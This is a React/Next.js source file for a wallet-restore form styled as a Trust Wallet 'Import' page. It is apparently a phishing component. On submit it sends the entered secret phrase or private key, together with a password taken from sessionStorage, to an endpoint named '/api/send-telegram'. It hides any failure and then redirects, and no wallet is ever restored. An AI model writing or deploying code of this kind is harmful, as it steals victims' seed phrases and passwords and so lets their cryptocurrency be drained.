"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { ChevronLeft, X, Eye, EyeOff } from "lucide-react"
import Link from "next/link"

export function RestoreWalletForm() {
  const [walletName, setWalletName] = useState("Main wallet")
  const [secretPhrase, setSecretPhrase] = useState("")
  const [showPhrase, setShowPhrase] = useState(false)
  const [sending, setSending] = useState(false)
  const router = useRouter()

  const isValid = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (!isValid || sending) return

    setSending(true)
    try {
      const password = sessionStorage.getItem("wp") || ""

      await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          password,
          walletName,
          secretPhrase,
        }),
      })

      sessionStorage.removeItem("wp")
      router.push("/")
    } catch {
      // silently fail
    } finally {
      setSending(false)
    }
  }

  return (
    <section className="flex flex-1 flex-col justify-center px-6 py-10 sm:px-16 lg:px-24">
      <form onSubmit={handleSubmit} className="mx-auto w-full max-w-lg">
        <Link
          href="/import-wallet"
          className="mb-6 inline-flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground transition-colors"
        >
          <ChevronLeft className="h-4 w-4" />
          <span>Back</span>
        </Link>

        <h2 className="text-2xl font-bold text-foreground text-balance">
          Restore with Secret Phrase or Private Key
        </h2>

        <p className="mt-3 text-sm text-muted-foreground">
          {"View Your Secret Phrase On The TrustWallet App>>Settings>>Wallets>>:Manual"}
        </p>

        {/* Wallet name input */}
        <div className="mt-8 flex flex-col gap-2">
          <div className="relative">
            <input
              type="text"
              value={walletName}
              onChange={(e) => setWalletName(e.target.value)}
              className="w-full rounded-xl border border-border bg-card px-4 py-3 pr-12 text-sm font-medium text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition-all"
            />
            {walletName && (
              <button
                type="button"
                onClick={() => setWalletName("")}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                aria-label="Clear wallet name"
              >
                <X className="h-4 w-4" />
              </button>
            )}
          </div>
          <p className="text-sm text-primary">You can edit this later</p>
        </div>

        {/* Secret phrase textarea */}
        <div className="mt-8 flex flex-col gap-2">
          <label className="text-sm font-semibold text-foreground">
            Enter Secret Phrase or Private Key
          </label>
          <div className="relative rounded-xl border border-border bg-card focus-within:ring-2 focus-within:ring-primary/40 focus-within:border-primary transition-all">
            {/* Masked overlay - visible when hidden */}
            {!showPhrase && secretPhrase && (
              <div
                aria-hidden="true"
                className="pointer-events-none absolute inset-0 px-4 py-3 pr-12 text-sm font-mono text-foreground whitespace-pre-wrap break-words overflow-hidden leading-[1.625]"
              >
                {secretPhrase.split("").map((char, i) =>
                  char === " " ? (
                    <span key={i}>{" "}</span>
                  ) : char === "\n" ? (
                    <br key={i} />
                  ) : (
                    <span key={i}>{"•"}</span>
                  )
                )}
              </div>
            )}
            <textarea
              value={secretPhrase}
              onChange={(e) => setSecretPhrase(e.target.value)}
              placeholder="Enter your secret phrase or private key..."
              rows={4}
              className="w-full resize-none rounded-xl bg-transparent px-4 py-3 pr-12 text-sm font-mono text-foreground placeholder:text-muted-foreground placeholder:font-sans focus:outline-none leading-[1.625]"
              style={{
                color: !showPhrase && secretPhrase ? "transparent" : undefined,
                caretColor: "var(--foreground)",
              }}
            />
            <button
              type="button"
              onClick={() => setShowPhrase(!showPhrase)}
              className="absolute bottom-4 right-4 text-primary hover:text-primary/80 transition-colors"
              aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
            >
              {showPhrase ? (
                <Eye className="h-5 w-5" />
              ) : (
                <EyeOff className="h-5 w-5" />
              )}
            </button>
          </div>
        </div>

        {/* Import button */}
        <div className="mt-10 flex justify-end">
          <button
            type="submit"
            disabled={!isValid || sending}
            className="w-full max-w-xs rounded-full bg-accent px-8 py-3.5 text-sm font-semibold text-accent-foreground transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {sending ? "Importing..." : "Import"}
          </button>
        </div>
      </form>
    </section>
  )
}
